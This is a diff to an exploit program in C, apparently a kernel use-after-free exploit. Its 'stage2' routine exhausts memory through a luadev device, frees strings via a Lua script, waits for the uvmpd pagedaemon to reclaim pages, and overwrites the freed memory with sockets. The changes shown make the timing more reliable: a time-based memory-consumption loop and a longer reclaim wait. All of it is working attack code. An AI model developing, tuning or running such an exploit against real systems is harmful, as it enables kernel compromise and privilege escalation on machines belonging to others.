@@ -13,6 +13,7 @@
 #include <stdbool.h>
 #include <assert.h>
 #include <ctype.h>
+#include <time.h>
 
 #include <sys/stat.h>
 #include <sys/socket.h>
@@ -591,6 +592,7 @@ int stage2_overwrite_uaf(exploit_state *state, size_t n) {
 void stage2(exploit_state *state) {
   int status;
   uint64_t addr;
+  time_t start;
 
   while (true) {
     int i = 0;
@@ -609,7 +611,8 @@ void stage2(exploit_state *state) {
     printf("[+] Reducing available memory...\n");
     luadev_create(state->devfd, state->consumemem_state);
 
-    while (i++ < 6) {
+    start = time(NULL);
+    while (time(NULL) - start < 10) {
       stage2_consume_memory(state);
       sleep(2);
     }
@@ -617,8 +620,8 @@ void stage2(exploit_state *state) {
     printf("[+] Creating UAFs...\n");
     luadev_load(state->devfd, state->stage2_state, "./stage2-freestrings.lua");
 
-    printf("[+] Waiting for uvmpd to reclaim pages...\n");
-    sleep(9);
+    printf("[+] Waiting 10s for uvmpd to reclaim pages...\n");
+    sleep(11);
 
     printf("[+] Overwriting UAF with sockets\n");
     status = stage2_overwrite_uaf(state, NSOCKETS);
@@ -632,7 +635,7 @@ void stage2(exploit_state *state) {
       return;
     }
   }
-}
+} 
 
 // ------------------------------------------------
 // ---- Stage3 ------------------------------------
